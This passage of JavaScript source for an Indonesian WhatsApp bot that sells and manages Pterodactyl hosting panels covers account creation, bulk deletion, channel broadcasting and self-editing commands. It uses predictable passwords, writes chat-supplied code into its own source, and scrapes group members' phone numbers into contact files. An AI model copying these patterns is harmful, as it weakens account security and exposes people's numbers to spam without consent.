          title: 'PILIH',
          sections: [
            {
              title: 'List Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'unlimited',
                  id: `.unli ${text}`
                },
                {
                  title: '1GB',
                  id: `.1gb ${text}`
                },
                {
                  title: '2GB',
                  id: `.2gb ${text}`
                },
                {
                  title: '4GB',
                  id: `.4gb ${text}`
                },
                {
                  title: '5GB',
                  id: `.5gb ${text}`
                },
                {
                  title: '6GB',
                  id: `.6gb ${text}`
                },
                {
                  title: '7GB',
                  id: `.7gb ${text}`
                },
                {
                  title: '8GB',
                  id: `.8gb ${text}`
                },
                {
                  title: '9GB',
                  id: `.9gb ${text}`
                },
                {
                  title: '10GB',
                  id: `.10gb ${text}`
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  text: "PILIH RAM PANEL\n",
  contextInfo: {
    isForwarded: true,
    mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
  }
}, { quoted: m });
}
break


case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@fr3.com"
let name = capital(username) + " Server"
let password = username+"FR3"
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(global.domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(global.domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: qlive})
delete global.panel
}
break

case "addcase": {
if (!isCreator) return Reply(mess.owner)
  if (!text) return Nvidia.sendMessage(m.chat, { text: `Contoh: ${prefix}addcase case nya` });
  
  const namaFile = path.join(__dirname, 'airbus.js');
  const caseBaru = `${text}\n\n`;
  
  const tambahCase = (data, caseBaru) => {
    const posisiDefault = data.lastIndexOf("default:");
    if (posisiDefault !== -1) {
      const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
      return { success: true, kodeBaruLengkap };
    } else {
      return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
    }
  };
  
  fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
      console.error('Terjadi kesalahan saat membaca file:', err);
      return Nvidia.sendMessage(m.chat, { text: `Terjadi kesalahan saat membaca file: ${err.message}` });
    }
    
    const result = tambahCase(data, caseBaru);
    if (result.success) {
      fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
        if (err) {
          console.error('Terjadi kesalahan saat menulis file:', err);
          return Nvidia.sendMessage(m.chat, { text: `Terjadi kesalahan saat menulis file: ${err.message}` });
        } else {
          console.log('Sukses menambahkan case baru:');
          console.log(caseBaru);
          return Nvidia.sendMessage(m.chat, { text: 'Sukses menambahkan case!' });
        }
      });
    } else {
      console.error(result.message);
      return Nvidia.sendMessage(m.chat, { text: result.message });
    }
  });
}
break

case "delcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Nvidia.sendMessage(m.chat, { text: `Contoh: ${prefix}delcase nama case` });
 
 const fs = require('fs').promises;
 
 async function dellCase(filePath, caseNameToRemove) {
 try {
 let data = await fs.readFile(filePath, 'utf8');
 const regex = new RegExp(`case\\s+"${caseNameToRemove}":[\\s\\S]*?break`, "g");
 const modifiedData = data.replace(regex, '');
 
 if (data === modifiedData) {
 return Nvidia.sendMessage(m.chat, { text: 'Case tidak ditemukan atau sudah dihapus.' });
 }
 
 await fs.writeFile(filePath, modifiedData, 'utf8');
 return Nvidia.sendMessage(m.chat, { text: 'Sukses menghapus case!' });
 } catch (err) {
 return Nvidia.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` });
 }
 }
 
 dellCase('./command/airbus.js', text);
}
break

case "listadmin": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
let f = await fetch(global.domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qtext})
}
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "server": {
if (!isCreator) return Reply(mess.owner)
const argsString = body.trim();
 const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludedIds.length === 0) {
 return m.reply('Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.\nContoh: . , 101, 102, 103');
 }

 try {
 // Mendapatkan daftar server
 let f = await fetch(global.domain + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let servers = res.data;

 if (!servers || servers.length === 0) {
 return m.reply('Tidak ada server yang ditemukan.');
 }

 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedIds.includes(s.id.toString())) {
 m.reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domain + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 if (deleteServer.ok) {
 m.reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 m.reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }

 m.reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case "clearuser": {
if (!isCreator) return Reply(mess.owner)
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Sellect',
 sections: [
 {
 title: 'pilih ukuran',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'user V1',
 id: `.user`
 },
 {
 title: 'user V2',
 id: `.user-v2`
 }, 
 {
 title: 'user V3',
 id: `.user-v3`
 }, 
 {
 title: 'user V4',
 id: `.user-v4`
 }, 
 {
 title: 'user V5',
 id: `.user-v5`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "Pilih Server user mana yang ingin kamu hapus.",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "user": {
 if (!isOwner && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user
 let f = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}
case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("text bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await Nvidia.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await Nvidia.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Nvidia.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

 case "admin-v2": {
 if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply('Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.\nContoh: .${command} , 48, 49, 50');
 }

 try {
 let f = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
 }
 break
 
 case "clearadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text)  return m.reply("Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.");
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Sellect',
 sections: [
 {
 title: 'pilih ukuran',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'admin V1',
 id: `.admin ${text}`
 },
 {
 title: 'admin V2',
 id: `.admin-v2 ${text}`
 }, 
 {
 title: 'admin V3',
 id: `.admin-v3 ${text}`
 }, 
 {
 title: 'admin V4',
 id: `.admin-v4 ${text}`
 }, 
 {
 title: 'admin V5',
 id: `.admin-v5 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "Pilih Server admin mana yang ingin kamu hapus.",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "admin": {
 if (!isCreator) return Reply(mess.owner)
 const argsString = body.trim();
 const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

 if (excludeIds.length === 0) {
 return m.reply('Tolong masukkan ID yang ingin dikecualikan setelah tanda koma.\nContoh: ${command} , 48, 49, 50');
 }

 try {
 let f = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 for (let user of users) {
 let u = user.attributes;

 // Jika ID ada di daftar pengecualian, lewati proses penghapusan
 if (excludeIds.includes(u.id.toString())) {
 m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 continue;
 }

 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 if (deleteUser.ok) {
 m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : FR3HOSTING_*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }

 m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}
break

case "delpanel": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break;

case "delpanel": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "produk": {
await slideButton(m.chat)
}
break

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Nvidia.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer FR3 - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Nvidia.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Buyyer FR3 - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
